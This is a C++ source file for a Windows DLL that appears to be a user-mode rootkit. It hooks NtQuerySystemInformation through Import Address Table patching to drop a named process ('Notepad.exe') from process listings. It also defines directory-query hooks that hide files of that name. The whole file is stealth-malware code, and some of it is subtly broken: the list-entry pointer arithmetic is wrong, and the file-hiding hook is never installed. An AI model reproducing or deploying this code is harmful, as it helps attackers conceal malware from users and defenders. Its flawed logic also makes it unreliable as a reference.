// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <winternl.h>
#include "structs.h"

#pragma warning(disable:4996)


PIMAGE_DOS_HEADER pDosHeader;
PIMAGE_NT_HEADERS pNtHeaders;
PIMAGE_OPTIONAL_HEADER pOptionalHeader;
PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor;
PIMAGE_THUNK_DATA pThunkDataIAT;
PIMAGE_THUNK_DATA pThunkDataINT;
PIMAGE_IMPORT_BY_NAME pImportByNameINT;
PIMAGE_IMPORT_BY_NAME pImportByNameIAT;
MEMORY_BASIC_INFORMATION mbi;

BYTE* p_original_func;
const wchar_t* to_hide = L"Notepad.exe";

NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
void dealFileIdBothDirectoryInformation(PVOID FileInformation);
void dealFileFullDirectoryInformation(PVOID FileInformation);
std::string getProcName();
void PatchIAT(std::string to_patch, BYTE* patchedFunc);

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )

{

    std::string proc_name = getProcName();
    std::string to_patch = "NtQuerySystemInformation";


    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		OutputDebugString("Attaching");
		DisableThreadLibraryCalls(hModule);
        PatchIAT(to_patch, (BYTE*)MyNtQuerySystemInformation);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
		OutputDebugString("Detaching");
		PatchIAT(to_patch, p_original_func);
        break;
    }
    return TRUE;
}


std::string getProcName() {
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	std::string proc_name = buffer;
	size_t last_index = proc_name.find_last_of("\\");
	proc_name = proc_name.substr(last_index + 1);
	proc_name[0] = toupper(proc_name[0]);
	//OutputDebugString(proc_name.c_str());
	return proc_name;
}

void PatchIAT(std::string to_patch, BYTE* patchedFunc) {
    std::string to_patch_a = to_patch + "A";
    std::string to_patch_w = to_patch + "W";
    pDosHeader = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
    pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pDosHeader + pDosHeader->e_lfanew);
    pOptionalHeader = &(pNtHeaders->OptionalHeader);
    PIMAGE_IMPORT_DESCRIPTOR end = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pDosHeader + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pDosHeader + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (true) {
        /*OutputDebugString("Current dll checked");
        char* dllname = (char*)((BYTE*)pDosHeader + pImportDescriptor->Name);
        OutputDebugString(dllname);*/
        pThunkDataINT = (PIMAGE_THUNK_DATA)((BYTE*)pDosHeader + pImportDescriptor->OriginalFirstThunk);
        pThunkDataIAT = (PIMAGE_THUNK_DATA)((BYTE*)pDosHeader + pImportDescriptor->FirstThunk);
        while (true) {
            if (pThunkDataINT->u1.AddressOfData == 0 || pThunkDataIAT->u1.AddressOfData == 0 || (pThunkDataINT->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                break;
            }
            pImportByNameINT = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pDosHeader + pThunkDataINT->u1.AddressOfData);
            if (strcmp(pImportByNameINT->Name, to_patch.c_str()) == 0 || strcmp(pImportByNameINT->Name, to_patch_a.c_str()) == 0 || strcmp(pImportByNameINT->Name, to_patch_w.c_str()) == 0) {
                VirtualQuery(pThunkDataIAT, &mbi, sizeof(mbi));
                if (mbi.Protect != PAGE_READWRITE) {
                    VirtualProtect(pThunkDataIAT, sizeof(PIMAGE_THUNK_DATA), PAGE_READWRITE, &mbi.Protect);
                }
                p_original_func = (BYTE*)pThunkDataIAT->u1.Function;
                pThunkDataIAT->u1.Function = (unsigned long long)patchedFunc;
                return;

            }
            pThunkDataIAT++;
            pThunkDataINT++;
        }
        pImportDescriptor++;
        if (pImportDescriptor > end) {
            break;
        }

    }
}




NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    PSYSTEM_PROCESS_INFORMATION curr;
    PSYSTEM_PROCESS_INFORMATION prev;
    NTSTATUS status = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))p_original_func)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(status)) {
		if (SystemInformationClass == SystemProcessInformation) {
            curr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation; //we can look at it as a linked list 
            prev = NULL;
            while(true)
            {
                if (curr->ImageName.Buffer != NULL)
                {
					//OutputDebugString("Current process name: ");
					//OutputDebugStringW(curr->ImageName.Buffer);
                    if (wcscmp(curr->ImageName.Buffer, to_hide) == 0)
                    {
                        OutputDebugString("Found the process to hide");
                        if (prev == NULL) //meaning the process we want to hide was the first in the list
                        {
                            if (curr->NextEntryOffset == 0) { //this process was also the last just return nothing
                                SystemInformation = NULL;
                            }
                            else {
                                SystemInformation = curr + curr->NextEntryOffset;
                            }
                        }
                        else //the process wasnt the first so we have a previous we can link to the next 
                        {
                            if (curr->NextEntryOffset == 0) { //this process was also the last just finish in previous
                                prev->NextEntryOffset = 0;
                            }
                            else {
                                prev->NextEntryOffset += curr->NextEntryOffset; //need to add the offsets
                            }
                        }
                    }
                    else {
						prev = curr; // we promote prev only if we didnt find the process to hide
                    }
                }
                
                if (curr->NextEntryOffset == 0)
                    break;
				curr = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)curr + curr->NextEntryOffset);
            } 
		}
		
	}
    return status;
}

NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
    NTSTATUS status = ((NTSTATUS(*)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN))p_original_func)(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (NT_SUCCESS(status)) {
		OutputDebugString("In the hook");
		OutputDebugString("FileInformationClass: ");
		OutputDebugString(std::to_string(FileInformationClass).c_str());
        switch (FileInformationClass)
        {
            case FILE_INFORMATION_CLASS_::FileIdBothDirectoryInformation:
                dealFileIdBothDirectoryInformation(FileInformation);
                break;
            case FILE_INFORMATION_CLASS_::FileFullDirectoryInformation:
                dealFileFullDirectoryInformation(FileInformation);
                break;
        }
	}
	return status;
}


void dealFileIdBothDirectoryInformation(PVOID FileInformation) {
    PFILE_ID_BOTH_DIR_INFORMATION curr;
    PFILE_ID_BOTH_DIR_INFORMATION prev;
    curr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
    prev = NULL;
    while (curr) {
        if (curr->FileNameLength != 0) {
            if (wcscmp(curr->FileName, to_hide) == 0 || wcscmp(curr->ShortName, to_hide) == 0) {
                OutputDebugString("Found the file to hide");
                if (prev == NULL) //meaning the file we want to hide was the first in the list
                {
                    if (curr->NextEntryOffset == 0) { //this file was also the last just return nothing
                        FileInformation = NULL;
                    }
                    else {
                        FileInformation = curr + curr->NextEntryOffset;
                    }
                }
                else //the file wasnt the first so we have a previous we can link to the next 
                {
                    if (curr->NextEntryOffset == 0) { //this file was also the last just finish in previous
                        prev->NextEntryOffset = 0;
                    }
                    else {
                        prev->NextEntryOffset += curr->NextEntryOffset; //need to add the offsets
                    }
                }
            }
        }
        if (curr->NextEntryOffset == 0)
            break;
        prev = curr;
        curr = (PFILE_ID_BOTH_DIR_INFORMATION)((BYTE*)curr + curr->NextEntryOffset);
    }
}

void dealFileFullDirectoryInformation(PVOID FileInformation) {
	PFILE_FULL_DIR_INFORMATION curr;
	PFILE_FULL_DIR_INFORMATION prev;
	curr = (PFILE_FULL_DIR_INFORMATION)FileInformation;
	prev = NULL;
	while (curr) {
		if (curr->FileNameLength != 0) {
			if (wcscmp(curr->FileName, to_hide) == 0) {
				OutputDebugString("Found the file to hide");
				if (prev == NULL) //meaning the file we want to hide was the first in the list
				{
					if (curr->NextEntryOffset == 0) { //this file was also the last just return nothing
						FileInformation = NULL;
					}
					else {
						FileInformation = curr + curr->NextEntryOffset;
					}
				}
				else //the file wasnt the first so we have a previous we can link to the next 
				{
					if (curr->NextEntryOffset == 0) { //this file was also the last just finish in previous
						prev->NextEntryOffset = 0;
					}
					else {
						prev->NextEntryOffset += curr->NextEntryOffset; //need to add the offsets
					}
				}
			}
		}
		if (curr->NextEntryOffset == 0)
			break;
		prev = curr;
		curr = (PFILE_FULL_DIR_INFORMATION)((BYTE*)curr + curr->NextEntryOffset);
	}
}